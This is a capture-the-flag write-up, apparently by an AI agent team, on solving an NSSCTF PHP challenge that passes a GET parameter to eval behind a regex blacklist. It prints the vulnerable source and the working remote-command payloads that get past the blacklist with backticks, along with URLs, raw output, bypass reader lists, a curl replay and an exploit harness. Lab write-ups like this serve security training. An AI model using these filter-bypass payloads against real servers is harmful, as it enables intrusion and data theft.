# Lane A — backtick `print()` shell chain → flag

- **Target:** http://node4.anna.nssctf.cn:24112/
- **Agent / task:** agent-2 / `t2` (attempt 1, `b04c1fe1-bf8d-4fc1-bb4a-4b04a16ef779`)
- **Verdict:** SOLVED — captain re-read the flag independently (`sort`) and confirmed it byte-identical
- **Flag:** `NSSCTF{This_IS_s0_easy_RCE}` (candidate `f1`)

## 1. Sink and filter, verbatim from the challenge source

Requesting the page **without** `?code=` prints `居然都不输入参数，可恶!!!!!!!!!` followed by
`show_source(__FILE__)`, which leaks the whole program:

```php
## 放弃把，小伙子，你真的不会RCE,何必在此纠结呢？？？？？？？？？？
if(isset($_GET['code'])){
    $code=$_GET['code'];
    if (!preg_match('/sys|pas|read|file|ls|cat|tac|head|tail|more|less|php|base|echo|cp|\$|\*|\+|\^|scan|\.|local|current|chr|crypt|show_source|high|readgzfile|dirname|time|next|all|hex2bin|im|shell/i',$code)){
        echo '看看你输入的参数！！！不叫样子！！';echo '<br>';
        eval($code);
    }
    else{
        die("你想干什么？？？？？？？？？");
    }
}
else{
    echo "居然都不输入参数，可恶!!!!!!!!!";
    show_source(__FILE__);
}
```

| marker | meaning |
| --- | --- |
| `看看你输入的参数！！！不叫样子！！` | `preg_match` did **not** match → `eval($code)` ran |
| `你想干什么？？？？？？？？？` | blacklist hit → `die()` |
| `居然都不输入参数，可恶!!!!!!!!!` | no `code` parameter |

Root cause: one case-insensitive **substring** regex over `$code`, and the **backtick operator
is not on it** — so `` `cmd` `` is unrestricted shell execution inside `eval`.

## 2. Winning chain — payload → exact URL → raw response

### Step 1 — prove shell execution

- **payload:** ``print(`id`);``
- **URL:** `http://node4.anna.nssctf.cn:24112/?code=print%28%60id%60%29%3B`
- **raw response (after the marker + `<br>`):**

```
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

### Step 2 — root listing → flag file

- **payload:** ``print(`dir /`);``
- **URL:** `http://node4.anna.nssctf.cn:24112/?code=print%28%60dir%20%2F%60%29%3B`
- **raw response:**

```
bin   dev  fffffffffflagafag  lib    media  opt   root	sbin  sys  usr
boot  etc  home		      lib64  mnt    proc  run	srv   tmp  var
```

`/fffffffffflagafag` sits at the filesystem root; it has **no dot and no blacklisted
substring**, so it is typeable literally — no `?` glob needed.
(Corroborated by ``print(`find / -maxdepth 2 -xdev`);``, whose tree ends `/home`,
`/.dockerenv`, `/fffffffffflagafag`.)

### Step 3 — read it (winning request)

- **payload:** ``print(`nl /fffffffffflagafag`);``
- **URL:** `http://node4.anna.nssctf.cn:24112/?code=print%28%60nl%20%2Ffffffffffflagafag%60%29%3B`
- **raw response:**

```
     1	NSSCTF{This_IS_s0_easy_RCE}
```

Independent replay by the captain with a second allowed reader,
``print(`sort /fffffffffflagafag`);`` (`…?code=print%28%60sort%20%2Ffffffffffflagafag%60%29%3B`),
returned the same string.

## 3. Proven dead ends (one line each)

- **`$` PHP variables — dead:** `\$` is blacklisted, so `$_GET`/`$_POST`/`$a=…` indirection is impossible; every payload must be literal inline code.
- **`.` dot — dead:** blacklisted, so no PHP string concatenation *and* no dotted filename can be typed (`/flag.txt` is unreachable verbatim; use a `?` glob instead).
- **`+` and `^` — dead:** blacklisted, so arithmetic / bitwise obfuscation can never synthesize a forbidden character.
- **`*` — dead:** blacklisted, so shell globs like `/ffff*` are untypeable in both the payload and PHP (my own pre-check refused `print_r(glob('/ffff*'));` on `*`).
- **`echo` — dead:** blacklisted as a substring, so output must come from `print`, `print_r`, `var_dump` or `die` (never from PHP `echo`, even nested inside another word).
- **`ls`/`cat` readers — dead:** both are blacklisted substrings, so `ls`, `cat`, `tac`, `head`, `tail`, `more`, `less` (and any word or path containing them) cannot appear inside the backticks; readers used instead: `nl`, `sort`, `od`, `xxd`, `strings`, `awk`, `sed`, `grep`, `dd`, `printf`, `dir`.
- **Also unusable (same reason, noted for completeness):** `sys pas read file php base cp scan local current chr crypt show_source high readgzfile dirname time next all hex2bin im shell` — e.g. no `system`/`shell_exec`/`file_get_contents`/`base64_decode`/`highlight_file`.

## 4. One-liner replay

```bash
curl -s -G 'http://node4.anna.nssctf.cn:24112/' \
     --data-urlencode 'code=print(`nl /fffffffffflagafag`);'
# … 看看你输入的参数！！！不叫样子！！<br>     1	NSSCTF{This_IS_s0_easy_RCE}
```

## 5. Harness

`node4-24112/exploit.py` (python3 stdlib only, runnable end-to-end):

```
python exploit.py --selftest              # local blacklist pre-check sanity
python exploit.py -c 'print(`id`);'       # raw payload
python exploit.py -s 'dir /'              # run a command inside backticks
python exploit.py -r '/fffffffffflagafag' # read via nl
python exploit.py --list /                # dir
python exploit.py --find /                # find -maxdepth 3
```

`send()` runs a local copy of the challenge regex and refuses to transmit a matching payload,
so a typo cannot burn a request; `send(code, force=True)` bypasses the guard for research.
